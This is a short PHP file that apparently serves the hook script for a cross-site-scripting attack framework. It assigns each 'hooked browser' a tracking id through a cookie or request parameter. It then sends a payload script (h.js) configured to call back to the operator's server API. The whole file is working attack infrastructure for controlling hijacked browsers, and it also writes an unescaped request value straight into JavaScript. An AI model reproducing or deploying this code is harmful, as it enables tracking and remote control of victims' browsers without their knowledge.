<?php
require("../config.php");

// figure out the id for the hooked browser.   if we don't have one, create one
if (isset($_COOKIE['xssid'])) {
	$id = $_COOKIE['xssid'];
}
// no cookie?  maybe a get/post param?
else {
	if (isset($_REQUEST['id']))
		$id = $_REQUEST['id'];
	// nothing, create an id
	else
		$id = preg_replace("/[\+\/\=]/", "", base64_encode(openssl_random_pseudo_bytes(12)));
	// try to store the id
	setcookie("xssid", $id, 0, "/");
}

// the header has parameters custom to this server (server callbacks, etc)
$header = "xss.server = '{$_SERVER['HTTP_HOST']}';\n";
$header .= "xss.api = 'http://{$_SERVER['HTTP_HOST']}/api.php';\n";

// since the sploitid is custom to each hooked browser, we can't cache that
// this will be dumped onto each new h.php call
echo "var sploitid = '$id';\n";
require '../jsmin.php';
serve_javascript("h.js", $header);

?>
